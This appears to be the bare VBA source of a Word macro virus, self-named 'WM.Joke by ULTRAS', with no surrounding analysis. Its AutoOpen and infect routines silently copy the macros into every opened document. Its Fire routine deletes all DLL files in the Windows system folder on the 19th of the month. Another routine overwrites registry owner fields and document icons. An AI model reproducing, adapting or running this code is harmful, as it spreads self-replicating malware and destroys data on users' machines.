   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "??????, ????????, ???????? ??? ????????? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   On Error Resume Next
   WordBasic.Call "Joke.TM"
   WordBasic.Call "Fire"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.Call "Joke.infect"
   WordBasic.Call "Fire"
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   WordBasic.DisableAutoMacros
   End Sub

   Attribute VB_Name = "ULTRAS"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.ToolsOptionsUserInfo Name:="ULTRAS", Initials:="Joke", Address:="ULTRAS2@usa.net"
   WordBasic.FileSummaryInfo Author:="WM.Joke by ULTRAS"
       WordBasic.SetPrivateProfileString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner", "ULTRAS", ""
       WordBasic.SetPrivateProfileString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization", "Guerrilla", ""
       WordBasic.SetPrivateProfileString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "ProductName", "WM.Guerrilla by ULTRAS", ""
       WordBasic.SetPrivateProfileString "HKEY_CLASSES_ROOT\WORD.DOCUMENT.6\DefaultIcon\", "", "C:\Windows\System\Shell32.dll,31", ""
       WordBasic.SetPrivateProfileString "HKEY_CLASSES_ROOT\Word.Template\DefaultIcon\", "", "C:\Windows\System\Shell32.dll,32", ""
   End Sub

   Attribute VB_Name = "Joke"

   Dim FN$
   Public Sub MAIN()
   FN$ = ""
   Rem WM.Joke
   Rem ULTRAS "ultras2@usa.net"
   End Sub
   Private Sub infect()
   On Error GoTo -1: On Error GoTo JoIn
   WordBasic.DisableInput 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, RecommendReadOnly:=0
   FN$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy "Global:AutoExec", FN$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:AutoExit", FN$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoClose", FN$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoOpen", FN$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:ToolsMacro", FN$ + ":ToolsMacro", 1
   WordBasic.MacroCopy "Global:Filetemplates", FN$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:ToolsCustomize", FN$ + ":AutoExec", 1
   JoIn:
   End Sub
   Private Sub TM()
   On Error GoTo -1: On Error GoTo ID
   WordBasic.ScreenUpdating
   WordBasic.FileNew
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
   WordBasic.CurValues.ToolsMacro dlg
   WordBasic.Dialog.ToolsMacro dlg
   WordBasic.FileClose 2
   WordBasic.ScreenUpdating
   WordBasic.ToolsMacro dlg
   ID:
   End Sub

   Attribute VB_Name = "Fire"

   Public Sub MAIN()
   Dim Destroy$
   On Error Resume Next
   If WordBasic.Day(WordBasic.Now()) = 7 Then
   WordBasic.MsgBox "You Infected WM.Joke by ULTRAS", "ULTRAS"
   WordBasic.Call "Dlg.Password" = "ULTRAS"
   End If
   If WordBasic.Day(WordBasic.Now()) = 19 Then
   WordBasic.MsgBox "You Infected WM.Joke by ULTRAS", "ULTRAS"
   Destroy$ = "C:\Windows\system\*.dll"
   SetAttr Destroy$, 0
   WordBasic.Kill Destroy$
   End If
   WordBasic.Call "ULTRAS"
   End Sub
